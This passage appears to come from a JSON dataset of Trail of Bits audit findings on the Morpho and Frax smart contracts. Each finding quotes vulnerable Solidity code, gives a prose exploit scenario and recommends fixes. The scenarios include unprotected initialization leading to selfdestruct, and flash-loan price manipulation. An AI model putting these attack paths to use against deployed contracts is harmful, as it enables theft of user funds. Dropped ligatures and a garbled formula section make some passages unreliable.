Bob control a multisignature wallet that is the owner of a deployed Morpho contract. They decide to set _positionsManager to a newly upgraded contract but, while invoking setPositionsManager, they mistakenly omit the address. As a result, _positionsManager is set to the zero address, resulting in undened behavior. Recommendations Short term, add zero-value checks to all important address setters to ensure that owners cannot accidentally set addresses to incorrect values, misconguring the system. Specically, add zero-value checks to the setPositionsManager, setRewardsManager, setInterestRates, setTreasuryVault, and setIncentivesVault functions, as well as the _cETH and _cWeth parameters of the initialize function in the MorphoGovernance contract. Long term, incorporate Slither into a continuous integration pipeline, which will continuously warn developers when functions do not have checks for zero values.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "5. Risky use of toggle functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf", "body": "The codebase uses a toggle function, togglePauseStatus, to pause and unpause a market. This function is error-prone because setting a pause status on a market depends on the markets current state. Multiple uncoordinated pauses could result in a failure to pause a market in the event of an incident. /// @notice Toggles the pause status on a specific market in case of emergency. /// @param _poolTokenAddress The address of the market to pause/unpause. function togglePauseStatus(address _poolTokenAddress) external onlyOwner isMarketCreated(_poolTokenAddress) { } Types.MarketStatus storage marketStatus_ = marketStatus[_poolTokenAddress]; bool newPauseStatus = !marketStatus_.isPaused; marketStatus_.isPaused = newPauseStatus; emit PauseStatusChanged(_poolTokenAddress, newPauseStatus); Figure 5.1: The togglePauseStatus method in MorphoGovernance This issue also applies to togglePartialPauseStatus, toggleP2P, and toggleCompRewardsActivation in MorphoGovernance and to togglePauseStatus in IncentivesVault. Exploit Scenario All signers of a 4-of-9 multisignature wallet that owns a Morpho contract notice an ongoing attack that is draining user funds from the protocol. Two groups of four signers hurry to independently call togglePauseStatus, resulting in a failure to pause the system and leading to the further loss of funds. Recommendations Short term, replace the toggle functions with ones that explicitly set the pause status to true or false. Long term, carefully review the incident response plan and ensure that it leaves as little room for mistakes as possible.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "6. Anyone can destroy Morphos implementation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf", "body": "An incorrect access control on the initialize function for Morphos implementation contract allows anyone to destroy the contract. Morpho uses the delegatecall proxy pattern for upgradeability: abstract contract MorphoStorage is OwnableUpgradeable, ReentrancyGuardUpgradeable { Figure 6.1: contracts/compound/MorphoStorage.sol#L16 With this pattern, a proxy contract is deployed and executes a delegatecall to the implementation contract for certain operations. Users are expected to interact with the system through this proxy. However, anyone can also directly call Morphos implementation contract. Despite the use of the proxy pattern, the implementation contract itself also has delegatecall capacities. For example, when called in the updateP2PIndexes function, setReserveFactor executes a delegatecall on user-provided addresses: function setReserveFactor(address _poolTokenAddress, uint16 _newReserveFactor) external onlyOwner isMarketCreated(_poolTokenAddress) { if (_newReserveFactor > MAX_BASIS_POINTS) revert ExceedsMaxBasisPoints(); updateP2PIndexes(_poolTokenAddress); Figure 6.2: contracts/compound/MorphoGovernance.sol#L203-L209 function updateP2PIndexes(address _poolTokenAddress) public { address(interestRatesManager).functionDelegateCall( abi.encodeWithSelector( interestRatesManager.updateP2PIndexes.selector, _poolTokenAddress ) ); } Figure 6.3: contracts/compound/MorphoUtils.sol#L119-L126 These functions are protected by the onlyOwner modier; however, the systems owner is set by the initialize function, which is callable by anyone: function initialize( IPositionsManager _positionsManager, IInterestRatesManager _interestRatesManager, IComptroller _comptroller, Types.MaxGasForMatching memory _defaultMaxGasForMatching, uint256 _dustThreshold, uint256 _maxSortedUsers, address _cEth, address _wEth ) external initializer { __ReentrancyGuard_init(); __Ownable_init(); Figure 6.4: contracts/compound/MorphoGovernance.sol#L114-L125 As a result, anyone can call Morpho.initialize to become the owner of the implementation and execute any delegatecall from the implementation, including to a contract containing a selfdestruct. Doing so will cause the proxy to point to a contract that has been destroyed. This issue is also present in PositionsManagerForAave. Exploit Scenario The system is deployed. Eve calls Morpho.initialize on the implementation and then calls setReserveFactor, triggering a delegatecall to an attacker-controlled contract that self-destructs. As a result, the system stops working. Recommendations Short term, add a constructor in MorphoStorage and PositionsManagerForAaveStorage that will set an is_implementation variable to true and check that this variable is false before executing any critical operation (such as initialize, delegatecall, and selfdestruct). By setting this variable in the constructor, it will be set only in the implementation and not in the proxy. Long term, carefully review the pitfalls of using the delegatecall proxy pattern. References  Breaking Aave Upgradeability", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "7. Lack of return value checks during token transfers ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf", "body": "In certain parts of the codebase, contracts that execute transfers of the Morpho token do not check the values returned from those transfers. The development of the Morpho token was not yet complete at the time of the audit, so we were unable to review the code specic to the Morpho token. Some tokens that are not ERC20 compliant return false instead of reverting, so failure to check such return values could result in undened behavior, including the loss of funds. If the Morpho token adheres to ERC20 standards, then this issue may not pose a risk; however, due to the lack of return value checks, the possibility of undened behavior cannot be eliminated. function transferMorphoTokensToDao(uint256 _amount) external onlyOwner { morphoToken.transfer(morphoDao, _amount); emit MorphoTokensTransferred(_amount); } Figure 7.1: The transerMorphoTokensToDao method in IncentivesVault Exploit Scenario The Morpho token code is completed and deployed alongside the other Morpho system components. It is implemented in such a way that it returns false instead of reverting when transfers fail, leading to undened behavior. Recommendations Short term, consider using a safeTransfer library for all token transfers. Long term, review the token integration checklist and check all the components of the system to ensure that they interact with tokens safely.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "8. Risk of loss of precision in division operations ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf", "body": "A common pattern in the codebase is to divide a users debt by the total supply of a token; a loss of precision in these division operations could occur, which means that the supply delta would not account for the entire matched delta amount. The impact of this potential loss of precision requires further investigation. For example, the borrowLogic method uses this pattern: toWithdraw += matchedDelta; remainingToBorrow -= matchedDelta; delta.p2pSupplyDelta -= matchedDelta.div(poolSupplyIndex); emit P2PSupplyDeltaUpdated(_poolTokenAddress, delta.p2pSupplyDelta); Figure 8.1: Part of the borrowLogic() method Here, if matchedDelta is not a multiple of poolSupplyIndex, the remainder would not be taken into account. In an extreme case, if matchedDelta is smaller than poolSupplyIndex, the result of the division operation would be zero. An attacker could exploit this loss of precision to extract small amounts of underlying tokens sitting in the Morpho contract. Exploit Scenario Bob transfers some Dai to the Morpho contract by mistake. Eve sees this transfer, deposits some collateral, and then borrows an amount of Dai from Morpho small enough that it does not aect Eve's debt. Eve withdraws her deposited collateral and walks out with Bobs Dai. Further investigation into this exploit scenario is required. Recommendations Short term, add checks to validate input data to prevent precision issues in division operations. Long term, review all the arithmetic that is vulnerable to rounding issues.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "1. Testing is not routine ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The Frax Solidity repository does not have reproducible tests that can be run locally. Having reproducible tests is one of the best ways to ensure a codebases functional correctness. This nding is based on the following events:    We tried to carry out the instructions in the Frax Solidity README at commit 31dd816 . We were unsuccessful. We reached out to Frax Finance for assistance. Frax Finance in turn pushed eight additional commits to the Frax Solidity repository (not counting merge commits). With these changes, we were able to run some of the tests, but not all of them. These events suggest that tests require substantial eort to run (as evidenced by the eight additional commits), and that they were not functional at the start of the assessment. Exploit Scenario Eve exploits a aw in a Frax Solidity contract. The aw would likely have been revealed through unit tests. Recommendations Short term, develop reproducible tests that can be run locally for all contracts. A comprehensive set of unit tests will help expose errors, protect against regressions, and provide a sort of documentation to users. Long term, incorporate unit testing into the CI process:   Run the tests specic to contract X when a push or pull request aects contract X. Run all tests before deploying any new code, including updates to existing contracts. Automating the testing process will help ensure the tests are run regularly and consistently.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "2. No clear mapping from contracts to tests ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "There are 405 Solidity les within the contracts folder 1 , but there are only 80 les within the test folder 2 . Thus, it is not clear which tests correspond to which contracts. The number of contracts makes it impractical for a developer to run all tests when working on any one contract. Thus, to test a contract eectively, a developer will need to know which tests are specic to that contract. Furthermore, as per TOB-FRSOL-001 , we recommend that the tests specic to contract X be run when a push or pull request aects contract X. To apply this recommendation, a mapping from the contracts to their relevant tests is needed. Exploit Scenario Alice, a Frax Finance developer, makes a change to a Frax Solidity contract. Alice is unable to determine the le that should be used to test the contract and deploys the contract untested. The contract is exploited using a bug that would have been revealed by a test. Recommendations Short term, for each contract, produce a list of tests that exercise that contract. If any such list is empty, produce tests for that contract. Having such lists will help facilitate contract testing following a change to it. Long term, as per TOB-FRSOL-001 , incorporate unit testing into the CI process by running the tests specic to contract X when a push or pull request aects contract X. Automating the testing process will help ensure the tests are run regularly and consistently. 1 find contracts -name '*.sol' | wc -l 2 find test -type f | wc -l", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "3. amoMinterBorrow cannot be paused ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The amoMinterBorrow function does not check for any of the paused ags or whether the minters associated collateral type is enabled. This reduces the FraxPoolV3 custodians ability to limit the scope of an attack. The relevant code appears in gure 3.1. The custodian can set recollateralizePaused[minter_col_idx] to true if there is a problem with recollateralization, and collateralEnabled[minter_col_idx] to false if there is a problem with the specic collateral type. However, amoMinterBorrow checks for neither of these. // Bypasses the gassy mint->redeem cycle for AMOs to borrow collateral function amoMinterBorrow ( uint256 collateral_amount ) external onlyAMOMinters { // Checks the col_idx of the minter as an additional safety check uint256 minter_col_idx = IFraxAMOMinter ( msg.sender ). col_idx (); // Transfer TransferHelper. safeTransfer (collateral_addresses[minter_col_idx], msg.sender , collateral_amount); } Figure 3.1: contracts/Frax/Pools/FraxPoolV3.sol#L552-L559 Exploit Scenario Eve discovers and exploits a bug in an AMO contract. The FraxPoolV3 custodian discovers the attack but is unable to stop it. The FraxPoolV3 owner is required to disable the AMO contracts. This occurs after signicant funds have been lost. Recommendations Short term, require recollateralizePaused[minter_col_idx] to be false and collateralEnabled[minter_col_idx] to be true for a call to amoMinterBorrow to succeed. This will help the FraxPoolV3 custodian to limit the scope of an attack. Long term, regularly review all uses of contract modiers, such as collateralEnabled . Doing so will help to expose bugs like the one described here.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "4. Array updates are not constant time ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "In several places, arrays are allowed to grow without bound, and those arrays are searched linearly. If an array grows too large and the block gas limit is too low, such a search would fail. An example appears in gure 4.1. Minters are pushed to but never popped from minters_array . When a minter is removed from the array, its entry is searched for and then set to 0 . Note that the cost of such a search is proportional to the searched-for entrys index within the array. Thus, there will eventually be entries that cannot be removed under the current block gas limits because their positions within the array are too large. function removeMinter ( address minter_address ) external onlyByOwnGov { require (minter_address != address ( 0 ), \"Zero address detected\" ); require (minters[minter_address] == true , \"Address nonexistant\" ); // Delete from the mapping delete minters[minter_address]; // 'Delete' from the array by setting the address to 0x0 for ( uint i = 0 ; i < minters_array.length; i++){ if (minters_array[i] == minter_address) { minters_array[i] = address ( 0 ); // This will leave a null in the array and keep the indices the same break ; } } emit MinterRemoved (minter_address); } Figure 4.1: contracts/ERC20/__CROSSCHAIN/CrossChainCanonical.sol#L269-L285 Note that occasionally popping values from minters_array is not sucient to address the issue. An array can be popped from occasionally, yet its size can still be unbounded. A similar problem exists in CrossChainCanonical.sol with respect to bridge_tokens_array . This problem appears to exist in many parts of the codebase. Exploit Scenario Eve tricks Frax Finance into adding her minter to the CrosschainCanonical contract. Frax Finance later decides to remove her minter, but is unable to do so because minters_array has grown too large and block gas limits are too low. Recommendations Short term, enforce the following policy throughout the codebase: an arrays size is bounded, or the array is linearly searched, but never both. Arrays that grow without bound can be updated by moving computations, such as the computation of the index that needs to be updated, o-chain. Alternatively, the code that uses the array could be adjusted to eliminate the need for the array or to instead use a linked list. Adopting these changes will help ensure that the success of critical operations is not dependent on block gas limits. Long term, incorporate a check for this problematic code pattern into the CI pipeline. In the medium term, such a check might simply involve regular expressions. In the longer term, use Semgrep for Solidity if or when such support becomes stable. This will help to ensure the problem is not reintroduced into the codebase.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "5. Incorrect calculation of collateral amount in redeemFrax ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The redeemFrax function of the FraxPoolV3 contract multiplies a FRAX amount with the collateral price to calculate the equivalent collateral amount (see the highlights in gure 5.1). This is incorrect. The FRAX amount should be divided by the collateral price instead. Fortunately, in the current deployment of FraxPoolV3 , only stablecoins are used as collateral, and their price is set to 1 (also see issue TOB-FRSOL-009 ). This mitigates the issue, as multiplication and division by one are equivalent. If the collateral price were changed to a value dierent from 1 , the exploit scenario described below would become possible, enabling users to steal all collateral from the protocol. if (global_collateral_ratio >= PRICE_PRECISION) { // 1-to-1 or overcollateralized collat_out = frax_after_fee .mul(collateral_prices[col_idx]) .div( 10 ** ( 6 + missing_decimals[col_idx])); // PRICE_PRECISION + missing decimals fxs_out = 0 ; } else if (global_collateral_ratio == 0 ) { // Algorithmic fxs_out = frax_after_fee .mul(PRICE_PRECISION) .div(getFXSPrice()); collat_out = 0 ; } else { // Fractional collat_out = frax_after_fee .mul(global_collateral_ratio) .mul(collateral_prices[col_idx]) .div( 10 ** ( 12 + missing_decimals[col_idx])); // PRICE_PRECISION ^2 + missing decimals fxs_out = frax_after_fee .mul(PRICE_PRECISION.sub(global_collateral_ratio)) .div(getFXSPrice()); // PRICE_PRECISIONS CANCEL OUT } Figure 5.1: Part of the redeemFrax function ( FraxPoolV3.sol#412433 ) When considering the    of an entity  , it is common to think of it as the amount of another entity  or  s per  . that has a value equivalent to 1  . The unit of measurement of    is   , For example, the price of one apple is the number of units of another entity that can be exchanged for one unit of apple. That other entity is usually the local currency. For the US, the price of an apple is the number of US dollars that can be exchanged for an apple:   = $  .  1. Given a    and an amount of    , one can compute the equivalent     through multiplication:    =     .    2. Given a    and an amount of    , one can compute the equivalent     through division: =       /   .  In short, multiply if the known amount and price refer to the same entity; otherwise, divide. The getFraxInCollateral function correctly follows rule 2 by dividing a FRAX amount by the collateral price to get the equivalent collateral amount (gure 5.2). function getFRAXInCollateral ( uint256 col_idx , uint256 frax_amount ) public view returns ( uint256 ) { return frax_amount.mul(PRICE_PRECISION).div( 10 ** missing_decimals[col_idx]). div(collateral_prices[col_idx]) ; } Figure 5.2: The getFraxInCollateral function ( FraxPoolV3.sol#242244 ) Exploit Scenario A collateral price takes on a value other than 1 . This can happen through either a call to setCollateralPrice or future modications that fetch the price from an oracle (also see issue TOB-FRSOL-009 ). A collateral asset is worth $1,000. Alice mints 1,000 FRAX for 1 unit of collateral. Alice then redeems 1,000 FRAX for 1 million units of collateral ( ). As a result, Alice has stolen around $1 billion from the protocol. If the calculation were 1000 / 1000 correct, Alice would have redeemed her 1,000 FRAX for 1 unit of collateral ( 1000  1000 ). Recommendations Short term, in FraxPoolV3.redeemFrax , use the existing getFraxInCollateral helper function (gure 5.2) to compute the collateral amount that is equivalent to a given FRAX amount. Long term, verify that all calculations involving prices use the above rules 1 and 2 correctly.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "6. spotPriceOHM is vulnerable to manipulation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The OHM_AMO contract uses the Uniswap V2 spot price to calculate the value of the collateral that it holds. This price can be manipulated by making a large trade through the OHM-FRAX pool. An attacker can manipulate the apparent value of collateral and thereby change the collateralization rate at will. FraxPoolV3 appears to contain the most funds at risk, but any contract that uses FRAX.globalCollateralValue is susceptible to a similar attack. (It looks like Pool_USDC has buybacks paused, so it should not be able to burn FXS, at the time of writing.) function spotPriceOHM () public view returns ( uint256 frax_per_ohm_raw , uint256 frax_per_ohm ) { ( uint256 reserve0 , uint256 reserve1 , ) = (UNI_OHM_FRAX_PAIR.getReserves()); // OHM = token0, FRAX = token1 frax_per_ohm_raw = reserve1.div(reserve0); frax_per_ohm = reserve1.mul(PRICE_PRECISION).div(reserve0.mul( 10 ** missing_decimals_ohm)); } Figure 6.1: old_contracts/Misc_AMOs/OHM_AMO.sol#L174-L180 FRAX.globalCollateralValue loops through frax_pools_array , including OHM_AMO , and aggregates collatDollarBalance . The collatDollarBalance for OHM_AMO is calculated using spotPriceOHM and thus is vulnerable to manipulation. function globalCollateralValue() public view returns ( uint256 ) { uint256 total_collateral_value_d18 = 0 ; for ( uint i = 0 ; i < frax_pools_array.length; i++){ // Exclude null addresses if (frax_pools_array[i] != address ( 0 )){ total_collateral_value_d18 = total_collateral_value_d18.add(FraxPool(frax_pools_array[i]).collatDollarBalance()); } } return total_collateral_value_d18; } Figure 6.2: contracts/Frax/Frax.sol#L180-L191 buyBackAvailableCollat returns the amount the protocol will buy back if the aggregate value of collateral appears to back each unit of FRAX with more than is required by the current collateral ratio. Since globalCollateralValue is manipulable, the protocol can be articially forced into buying (burning) FXS shares and paying out collateral. function buybackAvailableCollat () public view returns ( uint256 ) { uint256 total_supply = FRAX.totalSupply(); uint256 global_collateral_ratio = FRAX.global_collateral_ratio(); uint256 global_collat_value = FRAX.globalCollateralValue(); if (global_collateral_ratio > PRICE_PRECISION) global_collateral_ratio = PRICE_PRECISION; // Handles an overcollateralized contract with CR > 1 uint256 required_collat_dollar_value_d18 = (total_supply.mul(global_collateral_ratio)).div(PRICE_PRECISION); // Calculates collateral needed to back each 1 FRAX with $1 of collateral at current collat ratio if (global_collat_value > required_collat_dollar_value_d18) { // Get the theoretical buyback amount uint256 theoretical_bbk_amt = global_collat_value.sub(required_collat_dollar_value_d18); // See how much has collateral has been issued this hour uint256 current_hr_bbk = bbkHourlyCum[curEpochHr()]; // Account for the throttling return comboCalcBbkRct(current_hr_bbk, bbkMaxColE18OutPerHour, theoretical_bbk_amt); } else return 0 ; } Figure 6.3: contracts/Frax/Pools/FraxPoolV3.sol#L284-L303 buyBackFXS calculates the amount of FXS to burn from the user, calls b urn on the FRAXShares contract, and sends the caller an equivalent dollar amount in USDC. function buyBackFxs ( uint256 col_idx , uint256 fxs_amount , uint256 col_out_min ) external collateralEnabled(col_idx) returns ( uint256 col_out ) { require (buyBackPaused[col_idx] == false , \"Buyback is paused\" ); uint256 fxs_price = getFXSPrice(); uint256 available_excess_collat_dv = buybackAvailableCollat(); // If the total collateral value is higher than the amount required at the current collateral ratio then buy back up to the possible FXS with the desired collateral require (available_excess_collat_dv > 0 , \"Insuf Collat Avail For BBK\" ); // Make sure not to take more than is available uint256 fxs_dollar_value_d18 = fxs_amount.mul(fxs_price).div(PRICE_PRECISION); require (fxs_dollar_value_d18 <= available_excess_collat_dv, \"Insuf Collat Avail For BBK\" ); // Get the equivalent amount of collateral based on the market value of FXS provided uint256 collateral_equivalent_d18 = fxs_dollar_value_d18.mul(PRICE_PRECISION).div(collateral_prices[col_idx]); col_out = collateral_equivalent_d18.div( 10 ** missing_decimals[col_idx]); // In its natural decimals() // Subtract the buyback fee col_out = (col_out.mul(PRICE_PRECISION.sub(buyback_fee[col_idx]))).div(PRICE_PRECISION); // Check for slippage require (col_out >= col_out_min, \"Collateral slippage\" ); // Take in and burn the FXS, then send out the collateral FXS.pool_burn_from( msg.sender , fxs_amount); TransferHelper.safeTransfer(collateral_addresses[col_idx], msg.sender , col_out); // Increment the outbound collateral, in E18, for that hour // Used for buyback throttling bbkHourlyCum[curEpochHr()] += collateral_equivalent_d18; } Figure 6.4: contracts/Frax/Pools/FraxPoolV3.sol#L488-L517 recollateralize takes collateral from a user and gives the user an equivalent amount of FXS, including a bonus. Currently, the bonus_rate is set to 0 , but a nonzero bonus_rate would signicantly increase the protability of an attack. // When the protocol is recollateralizing, we need to give a discount of FXS to hit the new CR target // Thus, if the target collateral ratio is higher than the actual value of collateral, minters get FXS for adding collateral // This function simply rewards anyone that sends collateral to a pool with the same amount of FXS + the bonus rate // Anyone can call this function to recollateralize the protocol and take the extra FXS value from the bonus rate as an arb opportunity function recollateralize( uint256 col_idx, uint256 collateral_amount, uint256 fxs_out_min) external collateralEnabled(col_idx) returns ( uint256 fxs_out) { require (recollateralizePaused[col_idx] == false , \"Recollat is paused\" ); uint256 collateral_amount_d18 = collateral_amount * ( 10 ** missing_decimals[col_idx]); uint256 fxs_price = getFXSPrice(); // Get the amount of FXS actually available (accounts for throttling) uint256 fxs_actually_available = recollatAvailableFxs(); // Calculated the attempted amount of FXS fxs_out = collateral_amount_d18.mul(PRICE_PRECISION.add(bonus_rate).sub(recollat_fee[col_idx]) ).div(fxs_price); // Make sure there is FXS available require (fxs_out <= fxs_actually_available, \"Insuf FXS Avail For RCT\" ); // Check slippage require (fxs_out >= fxs_out_min, \"FXS slippage\" ); // Don't take in more collateral than the pool ceiling for this token allows require (freeCollatBalance(col_idx).add(collateral_amount) <= pool_ceilings[col_idx], \"Pool ceiling\" ); // Take in the collateral and pay out the FXS TransferHelper.safeTransferFrom(collateral_addresses[col_idx], msg.sender , address ( this ), collateral_amount); FXS.pool_mint( msg.sender , fxs_out); // Increment the outbound FXS, in E18 // Used for recollat throttling rctHourlyCum[curEpochHr()] += fxs_out ; } Figure 6.5: contracts/Frax/Pools/FraxPoolV3.sol#L519-L550 Exploit Scenario FraxPoolV3.bonus_rate is nonzero. Using a ash loan, an attacker buys OHM with FRAX, drastically increasing the spot price of OHM. When FraxPoolV3.buyBackFXS is called, the protocol incorrectly determines that FRAX has gained additional collateral. This causes the pool to burn FXS shares and to send the attacker USDC of the equivalent dollar value. The attacker moves the price in the opposite direction and calls recollateralize on the pool, receiving and selling newly minted FXS, including a bonus, for prot. This attack can be carried out until the buyback and recollateralize hourly cap, currently 200,000 units, is reached. Recommendations Short term, take one of the following steps to mitigate this issue:   Call FRAX.removePool and remove OHM_AMO . Note, this may cause the protocol to become less collateralized. Call FraxPoolV3.setBbkRctPerHour and set bbkMaxColE18OutPerHour and rctMaxFxsOutPerHour to 0 . Calling toggleMRBR to pause USDC buybacks and recollateralizations would have the same eect. The implications of this mitigation on the long-term sustainability of the protocol are not clear. Long term, do not use the spot price to determine collateral value. Instead, use a time-weighted average price (TWAP) or an oracle such as Chainlink. If a TWAP is used, ensure that the underlying pool is highly liquid and not easily manipulated. Additionally, create a rigorous process to onboard collateral since an exploit of this nature could destabilize the system. References  samczsun, \"So you want to use a price oracle\"  euler-xyz/uni-v3-twap-manipulation", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "7. Return values of the Chainlink oracle are not validated ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The latestRoundData function returns a signed integer that is coerced to an unsigned integer without checking that the value is a positive integer. An overow (e.g., uint(-1) ) would drastically misrepresent the price and cause unexpected behavior. In addition, FraxPoolV3 does not validate the completion and recency of the round data, permitting stale price data that does not reect recent changes. function getFRAXPrice() public view returns ( uint256 ) { ( , int price, , , ) = priceFeedFRAXUSD.latestRoundData(); return uint256 (price).mul(PRICE_PRECISION).div( 10 ** chainlink_frax_usd_decimals); } function getFXSPrice() public view returns ( uint256 ) { ( , int price, , , ) = priceFeedFXSUSD.latestRoundData(); return uint256 (price).mul(PRICE_PRECISION).div( 10 ** chainlink_fxs_usd_decimals); } Figure 7.1: contracts/Frax/Pools/FraxPoolV3.sol#231239 An older version of Chainlinks oracle interface has a similar function, latestAnswer . When this function is used, the return value should be checked to ensure that it is a positive integer. However, round information does not need to be checked because latestAnswer returns only price data. Recommendations Short term, add a check to latestRoundData and similar functions to verify that values are non-negative before converting them to unsigned integers, and add an invariant that checks that the round has nished and that the price data is from the current round: require(updatedAt != 0 && answeredInRound == roundID) . Long term, dene a minimum update threshold and add the following check: require((block.timestamp - updatedAt <= minThreshold) && (answeredInRound == roundID)) . Furthermore, use consistent interfaces instead of mixing dierent versions. References  Chainlink AggregatorV3Interface", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "8. Unlimited arbitrage in CCFrax1to1AMM ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The CCFrax1to1AMM contract implements an automated market maker (AMM) with a constant price and zero slippage. It is a constant sum AMM that maintains the invariant  =  +  , where the token balances. must remain constant during swaps (ignoring fees) and and    are Constant sum AMMs are impractical because they are vulnerable to unlimited arbitrage. If the price dierence of the AMMs tokens in external markets is large enough, the most protable arbitrage strategy is to buy the total reserve of the more expensive token from the AMM, leaving the AMM entirely imbalanced. Other AMMs like Uniswap and Curve prevent unlimited arbitrage by making the price depend on the reserves. This limits prots from arbitrage to a fraction of the total reserves, as the price will eventually reach a point at which the arbitrage opportunity disappears. No such limit exists in the CCFrax1to1AMM contract. While arbitrage opportunities are somewhat limited by the token caps, fees, and gas prices, unlimited arbitrage is always possible once the reserves or the dierence between the FRAX price and the token price becomes large enough. While token_price swings are limited by the price_tolerance parameter, frax_price swings are not limited. Exploit Scenario The CCFrax1to1AMM contract is deployed, and price_tolerance is set to 0.05. A token  is whitelisted with a token_cap of 100,000 and a swap_fee of 0.0004. A user transfers 100,000 FRAX to an AMM. The price of minimum at which the AMM allows swaps, and the price of FRAX in an external market becomes 1.005. Alice buys (or takes out a ash loan of) $100,000 worth of market. Alice swaps all of her external market, making a prot of $960. No FRAX remains in the AMM. in the external for FRAX with the AMM and then sells all of her FRAX in the in an external market becomes 0.995, the    This scenario is conservative, as it assumes a balance of only 100,000 FRAX and a frax_price of 1.005. As frax_price and the balance increase, the arbitrage prot increases. Recommendations Short term, do not deploy CCFrax1to1AMM and do not fund any existing deployments with signicant amounts. Those funds will be at risk of being drained through arbitrage. Long term, when providing stablecoin-to-stablecoin liquidity, use a Curve pool or another proven and audited implementation of the stableswap invariant.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "9. Collateral prices are assumed to always be $1 ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "In the FraxPoolV3 contract, the setCollateralPrice function sets collateral prices and stores them in the collateral_prices mapping. As of December 13, 2021, collateral prices are set to $1 for all collateral types in the deployed version of the FraxPoolV3 contract. Currently, only stablecoins are used as collateral within the Frax Protocol. For those stablecoins, $1 is an appropriate price approximation, at most times. However, when the actual price of the collateral diers enough from $1, users could choose to drain value from the protocol through arbitrage. Conversely, during such price uctuations, other users who are not aware that FraxPoolV3 assumes collateral prices are always $1 can receive less value than expected. Collateral tokens that are not pegged to a specic value, like ETH or WBTC, cannot currently be used safely within FraxPoolV3 . Their prices are too volatile, and repeatedly calling setCollateralPrice is not a feasible solution to keeping their prices up to date. Exploit Scenario The price of FEI, one of the stablecoins collateralizing the Frax Protocol, changes to $0.99. Alice, a user, can still mint FRAX/FXS as if the price of FEI were $1. Ignoring fees, Alice can buy 1 million FEI for $990,000, mint 1 million FRAX/FXS with the 1 million FEI, and sell the 1 million FRAX/FXS for $1 million, making $10,000 in the process. As a result, the Frax Protocol loses $10,000. If the price of FEI changes to $1.01, Bob would expect that he can exchange his 1 million FEI for 1.01 million FRAX/FXS. Since FraxPoolV3 is not aware of the actual price of FEI, Bob receives only 1 million FRAX/FXS, incurring a 1% loss. Recommendations Short term, document the arbitrage opportunities described above. Warn users that they could lose funds if collateral prices dier from $1. Disable the option to set collateral prices to values not equal to $1. Long term, modify the FraxPoolV3 contract so that it fetches collateral prices from a price oracle.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "10. Solidity compiler optimizations can be problematic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "Frax Finance has enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past . A high-severity bug in the emscripten -generated solc -js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6 . More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizations causes a security vulnerability in the Frax Finance contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "11. Users are unable to limit the amount of collateral paid to FraxPoolV3 ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The amount of collateral and FXS that is paid by the user in mintFrax is dynamically computed from the collateral ratio and price. These parameters can change between transaction creation and transaction execution. Users currently have no way to ensure that the paid amounts are still within acceptable limits at the time of transaction execution. Exploit Scenario Alice wants to call mintFrax . In the time between when the transaction is broadcast and executed, the global collateral ratio, collateral, and/or FXS prices change in such a way that Alice's minting operation is no longer protable for her. The minting operation is still executed, and Alice loses funds. Recommendations Short term, add the maxCollateralIn and maxFXSIn parameters to mintFrax , enabling users to make the transaction revert if the amount of collateral and FXS that they would have to pay is above acceptable limits. Long term, always add such limits to give users the ability to prevent unacceptably large input amounts and unacceptably small output amounts when those amounts are dynamically computed.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "12. Incorrect default price tolerance in CCFrax1to1AMM ", "html_url": 